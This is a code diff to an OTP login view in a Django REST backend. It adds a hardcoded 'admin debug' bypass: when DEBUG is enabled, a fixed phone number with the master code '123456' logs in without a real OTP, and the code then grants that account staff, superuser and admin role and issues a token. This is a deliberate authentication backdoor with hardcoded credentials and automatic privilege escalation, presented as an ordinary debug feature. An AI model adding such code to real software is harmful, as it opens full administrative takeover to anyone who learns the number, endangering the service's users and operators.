@@ -164,13 +164,19 @@ class VerifyOTPView(APIView):
         
         # Master OTP for development/demo (only if DEBUG is True)
         is_demo = False
-        if settings.DEBUG and phone == "01711111111" and otp == "123456":
-            is_demo = True
-            logger.info("Demo login attempt with master OTP detected")
+        is_admin_debug = False
         
-        if is_demo or (cached_otp and hmac.compare_digest(cached_otp, otp)):
+        if settings.DEBUG and otp == "123456":
+            if phone == "01711111111":
+                is_demo = True
+                logger.info("Demo login attempt with master OTP detected")
+            elif phone == "01999999999":
+                is_admin_debug = True
+                logger.info("Admin debug login attempt with master OTP detected")
+        
+        if is_demo or is_admin_debug or (cached_otp and hmac.compare_digest(cached_otp, otp)):
             # Successful verification: delete OTP and reset attempts
-            if not is_demo:
+            if not (is_demo or is_admin_debug):
                 cache.delete(f"otp_{phone}")
             cache.delete(attempts_key)
             logger.info("OTP verification successful")
@@ -196,6 +202,14 @@ class VerifyOTPView(APIView):
                 user.is_superuser = False
                 user.role = 'demo'
                 user.save()
+            
+            # For admin debug, ALWAYS ensure they have access and correct role
+            if is_admin_debug:
+                if not user.is_staff or not user.is_superuser or user.role != 'admin':
+                    user.is_staff = True
+                    user.is_superuser = True
+                    user.role = 'admin'
+                    user.save()
             
             refresh = RefreshToken.for_user(user)
             return Response({
